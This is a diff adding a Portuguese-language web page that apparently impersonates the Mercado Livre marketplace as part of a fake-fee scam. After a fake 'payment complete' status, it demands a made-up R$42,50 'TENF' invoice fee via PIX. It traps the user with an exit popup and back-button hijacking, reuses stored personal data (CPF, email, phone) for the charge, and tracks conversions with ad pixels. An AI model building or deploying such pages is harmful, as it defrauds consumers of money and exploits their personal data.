@@ -1,0 +1,533 @@
+<!DOCTYPE html><html lang="pt"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>ML</title>
+    <link rel="stylesheet" href="css/nlyyEUFKgIx6.css">
+    <link rel="stylesheet" href="css/fjYVGFOj9m8B.css">
+    <link rel="stylesheet" href="css/B6Mzb2MYnypb.css">
+    <link rel="stylesheet" href="styles.html">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+
+<script>
+    let shouldShowPopup = true;
+
+    window.onbeforeunload = function(event) {
+        if (shouldShowPopup) {
+            const customPopup = document.getElementById('custom-popup');
+            customPopup.style.display = 'block';
+
+            // Para navegadores modernos
+            event.preventDefault();
+            event.returnValue = '';
+            return 'ATENÇÃO!\n\nAo sair desta página sem pagar a taxa, sua encomenda será perdida e outra pessoa terá a oportunidade de resgatá-la.';
+        }
+    };
+
+    function hideCustomPopup() {
+        const customPopup = document.getElementById('custom-popup');
+        customPopup.style.display = 'none';
+    }
+
+    function preventBackNavigation() {
+        window.history.pushState(null, '', window.location.href);
+        window.addEventListener('popstate', function(event) {
+            const customPopup = document.getElementById('custom-popup');
+            customPopup.style.display = 'block';
+            window.history.pushState(null, '', window.location.href);
+        });
+    }
+
+    window.onload = function() {
+        preventBackNavigation();
+
+        const finalButton = document.getElementById('finalButton');
+        if (finalButton) {
+            finalButton.addEventListener('click', function() {
+                shouldShowPopup = false;
+            });
+        }
+    };
+</script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '25660827120250641');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=25660827120250641&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D6G7SLBC77U2V3Q5N7A0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+</head>
+<body>
+   
+
+    <nav class="navbar" style="padding-top: 15px; background-color: #FEE602;">
+    <div class="menu-icon" style="padding-left: 3%;">
+        <img src="images/enKo0BwlJH8R.png" style="height: 5vh;" alt="Logo Central Vivara">
+    </div>
+
+    <div class="logo-central">
+    </div>
+
+    <div class="menu-icon" style="padding-right: 3%;">
+        <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: white">shopping_cart</span>
+    </div>
+</nav>
+
+
+
+
+
+
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;">
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <span class="material-symbols-outlined">local_shipping</span>
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+    
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pagamento concluído</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Emita sua nota fiscal</div>
+                        </div>
+                    </div>
+                </div>
+    
+         
+    
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Parabéns! Seu pagamento foi concluido com sucesso, agora é necessário que faça a emissão da Nota Fiscal. Clique abaixo para prosseguir!</p>
+    
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Emitir Nota Fiscal</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Emissão da Nota Fiscal</p>
+
+<div class="ad2" style="padding-top: 15px; padding-bottom: 100px;">
+
+            <div style="padding-top: 2px;"></div>
+
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+    
+
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container3">
+                        <span class="material-symbols-outlined">receipt</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Nota fiscal sendo emitida!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text2" class="hidden entrega-container" style="margin-top: 8px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: red;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Identificamos que existe uma pendência no seu pedido!</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text3" class="hidden entrega-container" style="background-color: #D40204; margin-top: 8px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">É necessário realizar o pagamento da TENF (Taxa de Emissão da Nota Fiscal) para Emitir a Nota Fiscal do seu produto e realizarmos o despacho. No valor único de R$42,50</div>
+                    </div>
+                </div>
+            </div>
+
+
+    <div id="text4" class="button-container hidden" style="padding-top: 15px;">
+        <button class="styled-button3" onclick="openPixModal()">
+            <span class="button-text">
+                <span class="button-title3">Pagar  TENF e receber pedido até </span>
+            </span>
+            <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+        </button>
+        <script>
+            // Função para adicionar dias
+            function adicionarDias() {
+                let hoje = new Date();
+                hoje.setDate(hoje.getDate() + 2);
+                let novoDia = hoje.getDate();
+                let novoMes = hoje.getMonth();
+                let dataAtualizada = `${novoDia.toString().padStart(2, '0')}/${(novoMes + 1).toString().padStart(2, '0')}`;
+                return dataAtualizada;
+            }
+
+            // Obtém a data atualizada
+            let dataAtualizada = adicionarDias();
+
+            // Atualiza o texto do botão com a data
+            document.querySelector('.button-title3').textContent += dataAtualizada;
+        </script>
+    </div>    
+
+</div>
+
+        
+
+    </div>
+    <div id="custom-popup">
+        <div id="popup-content">
+            <h2>ATENÇÃO!</h2>
+            <p>Ao sair desta página sem pagar a taxa, sua encomenda será perdida e outra pessoa terá a oportunidade de resgatá-la.</p>
+            <button onclick="hideCustomPopup(); openPixModal();">Efetuar pagamento da TENF</button>
+        </div>
+    </div>
+    
+    <!-- PIX Payment Modal -->
+    <div id="pix-modal" style="display:none; position:fixed; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:2000; overflow-y:auto;">
+        <div style="position:relative; background:#fff; width:90%; max-width:420px; margin:40px auto; border-radius:12px; padding:24px; box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+            <button onclick="closePixModal()" style="position:absolute; top:10px; right:14px; background:none; border:none; font-size:24px; cursor:pointer; color:#666;">&times;</button>
+
+            <!-- PIX Loading State -->
+            <div id="up-pix-loading" style="text-align:center; padding:40px 0;">
+                <div class="spinner" style="margin:0 auto 16px;"></div>
+                <p style="color:#333; font-size:16px;">Gerando PIX...</p>
+            </div>
+
+            <!-- PIX Content (QR + Code) -->
+            <div id="up-pix-content" style="display:none; text-align:center;">
+                <h3 style="font-family:'GellixBold',Arial,sans-serif; color:#333; margin-bottom:4px; font-size:18px;">Pagamento via PIX</h3>
+                <p style="font-size:14px; color:#666; margin-bottom:16px;">TENF - Taxa de Emissão da Nota Fiscal</p>
+
+                <div style="background:#f0f9f0; border:2px solid #00a650; border-radius:8px; padding:12px; margin-bottom:16px;">
+                    <p style="font-size:24px; color:#00a650; font-weight:bold; margin:0;">R$ 42,50</p>
+                </div>
+
+                <div id="up-qr-code" style="margin:16px auto; display:inline-block;"></div>
+
+                <p style="font-size:13px; color:#888; margin:8px 0 12px;">Escaneie o QR Code ou copie o código abaixo:</p>
+
+                <div style="display:flex; gap:8px; margin-bottom:16px;">
+                    <input type="text" id="up-pix-code" readonly style="flex:1; padding:10px; border:1px solid #ccc; border-radius:6px; font-size:12px; background:#f9f9f9; overflow:hidden; text-overflow:ellipsis;">
+                    <button onclick="copyUpPixCode()" style="padding:10px 16px; background:#00a650; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:14px; font-weight:bold; white-space:nowrap;">Copiar</button>
+                </div>
+
+                <button onclick="checkUpPayment()" class="up-check-payment-btn" style="width:100%; padding:14px; background:#FEE602; color:#333; border:none; border-radius:8px; font-size:16px; font-weight:bold; cursor:pointer; margin-bottom:8px;">Já paguei - Verificar</button>
+
+                <p style="font-size:12px; color:#999; margin-top:8px;">O pagamento é confirmado automaticamente em alguns segundos.</p>
+            </div>
+
+            <!-- PIX Confirmed State -->
+            <div id="up-pix-confirmed" style="display:none; text-align:center; padding:30px 0;">
+                <div style="width:64px; height:64px; background:#00a650; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:16px;">
+                    <span class="material-symbols-outlined" style="color:#fff; font-size:36px;">check</span>
+                </div>
+                <h3 style="font-family:'GellixBold',Arial,sans-serif; color:#00a650; font-size:20px;">Pagamento Confirmado!</h3>
+                <p style="color:#666; font-size:14px;">Sua nota fiscal será emitida em instantes.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast notification -->
+    <div id="up-toast" style="display:none; position:fixed; bottom:30px; left:50%; transform:translateX(-50%); background:#333; color:#fff; padding:12px 24px; border-radius:8px; font-size:14px; z-index:3000; transition:opacity 0.3s;">Código PIX copiado!</div>
+
+    <script src="js/mD8B2klvyXsn.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+    <script src="../js/cart.js"></script>
+
+    <script>
+    /* ============================================
+       UP Page - Internal PIX Payment Flow
+       TENF R$42,50 (4250 cents)
+       ============================================ */
+    (function() {
+        'use strict';
+
+        var UP_AMOUNT = 4250; // R$42,50 in cents
+        var upPaymentCode = null;
+        var upPollingInterval = null;
+
+        /* ---- Open / Close PIX Modal ---- */
+        window.openPixModal = function() {
+            var modal = document.getElementById('pix-modal');
+            if (modal) {
+                modal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+                shouldShowPopup = false; // prevent beforeunload popup
+                generateUpPix();
+            }
+        };
+
+        window.closePixModal = function() {
+            var modal = document.getElementById('pix-modal');
+            if (modal) {
+                modal.style.display = 'none';
+                document.body.style.overflow = '';
+                shouldShowPopup = true;
+            }
+        };
+
+        /* ---- Generate PIX ---- */
+        function generateUpPix() {
+            var loading = document.getElementById('up-pix-loading');
+            var content = document.getElementById('up-pix-content');
+            var confirmed = document.getElementById('up-pix-confirmed');
+
+            if (loading) loading.style.display = 'block';
+            if (content) content.style.display = 'none';
+            if (confirmed) confirmed.style.display = 'none';
+
+            // Get customer data from localStorage (saved by checkout page)
+            var customer = {};
+            try {
+                customer = JSON.parse(localStorage.getItem('ml_customer_data') || '{}');
+            } catch(e) {}
+
+            // Get UTM tracking data
+            var utms = {};
+            try { utms = JSON.parse(localStorage.getItem('ml_utms') || '{}'); } catch(e) {}
+            var fbp = localStorage.getItem('ml_fbp') || null;
+            var fbc = localStorage.getItem('ml_fbc') || null;
+
+            var payload = {
+                customer: {
+                    email: customer.email || '',
+                    name: customer.name || '',
+                    document: customer.document || customer.cpf || '',
+                    phone: customer.phone || customer.telefone || ''
+                },
+                amount: UP_AMOUNT,
+                items: [{
+                    id: 'tenf',
+                    name: 'TENF - Taxa de Emissão da Nota Fiscal',
+                    price: UP_AMOUNT,
+                    quantity: 1
+                }],
+                trackingParameters: Object.assign({}, utms, { fbp: fbp, fbc: fbc }),
+                metadata: {
+                    type: 'upsell_tenf'
+                }
+            };
+
+            fetch('/api/payment.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (!data.success || !data.pix_qrcode_text) {
+                    throw new Error(data.error || 'Erro ao gerar PIX');
+                }
+
+                upPaymentCode = data.payment_code;
+
+                // Generate QR Code
+                var qrContainer = document.getElementById('up-qr-code');
+                if (qrContainer && typeof qrcode !== 'undefined') {
+                    var qr = qrcode(0, 'M');
+                    qr.addData(data.pix_qrcode_text);
+                    qr.make();
+                    qrContainer.innerHTML = qr.createImgTag(5, 16);
+                }
+
+                // Set copy code
+                var codeInput = document.getElementById('up-pix-code');
+                if (codeInput) codeInput.value = data.pix_qrcode_text;
+
+                // Show content, hide loading
+                if (loading) loading.style.display = 'none';
+                if (content) content.style.display = 'block';
+
+                // Start polling for payment
+                startUpPolling();
+            })
+            .catch(function(err) {
+                if (loading) loading.innerHTML =
+                    '<p style="color:#f23d4f; font-size:15px;">Erro ao gerar PIX. Tente novamente.</p>' +
+                    '<button onclick="openPixModal()" style="margin-top:12px; padding:12px 24px; background:#00a650; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:14px;">Tentar novamente</button>';
+                console.error('UP PIX Error:', err);
+            });
+        }
+
+        /* ---- Copy PIX Code ---- */
+        window.copyUpPixCode = function() {
+            var input = document.getElementById('up-pix-code');
+            if (!input) return;
+
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(input.value).then(function() {
+                    showUpToast();
+                });
+            } else {
+                input.select();
+                document.execCommand('copy');
+                showUpToast();
+            }
+        };
+
+        function showUpToast() {
+            var toast = document.getElementById('up-toast');
+            if (toast) {
+                toast.style.display = 'block';
+                toast.style.opacity = '1';
+                setTimeout(function() {
+                    toast.style.opacity = '0';
+                    setTimeout(function() {
+                        toast.style.display = 'none';
+                    }, 300);
+                }, 2500);
+            }
+        }
+
+        /* ---- Payment Polling ---- */
+        function startUpPolling() {
+            if (upPollingInterval) clearInterval(upPollingInterval);
+            var maxAttempts = 120; // 10 min at 5s intervals
+            var attempts = 0;
+
+            upPollingInterval = setInterval(function() {
+                attempts++;
+                if (attempts > maxAttempts) {
+                    clearInterval(upPollingInterval);
+                    return;
+                }
+                checkUpPaymentStatus(false);
+            }, 5000);
+        }
+
+        window.checkUpPayment = function() {
+            var btn = document.querySelector('.up-check-payment-btn');
+            if (btn) btn.textContent = 'Verificando...';
+            checkUpPaymentStatus(true);
+        };
+
+        function checkUpPaymentStatus(manual) {
+            if (!upPaymentCode) return;
+
+            fetch('/api/check-payment.php?code=' + encodeURIComponent(upPaymentCode))
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    if (data.status === 'paid') {
+                        onUpPaymentConfirmed();
+                    } else if (manual) {
+                        var btn = document.querySelector('.up-check-payment-btn');
+                        if (btn) btn.textContent = 'Ainda não confirmado. Tente novamente.';
+                        setTimeout(function() {
+                            if (btn) btn.textContent = 'Já paguei - Verificar';
+                        }, 3000);
+                    }
+                })
+                .catch(function() {
+                    if (manual) {
+                        var btn = document.querySelector('.up-check-payment-btn');
+                        if (btn) btn.textContent = 'Erro. Tente novamente.';
+                    }
+                });
+        }
+
+        function onUpPaymentConfirmed() {
+            if (upPollingInterval) clearInterval(upPollingInterval);
+
+            var content = document.getElementById('up-pix-content');
+            var confirmed = document.getElementById('up-pix-confirmed');
+
+            if (content) content.style.display = 'none';
+            if (confirmed) confirmed.style.display = 'block';
+
+            // Fire FB Purchase event for upsell
+            if (typeof fbq === 'function') {
+                fbq('track', 'Purchase', {
+                    value: UP_AMOUNT / 100,
+                    currency: 'BRL',
+                    content_ids: ['tenf'],
+                    content_type: 'product'
+                });
+            }
+
+            // Fire TikTok CompletePayment for upsell
+            if (typeof ttq !== 'undefined') {
+                ttq.track('CompletePayment', {
+                    content_type: 'product',
+                    value: UP_AMOUNT / 100,
+                    currency: 'BRL'
+                });
+            }
+        }
+    })();
+    </script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl492182'},{'dcenter':'p3'},{'cp_id':'9883949'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/yAMjcGPQTfxN.js"></script>
+
+</body></html>
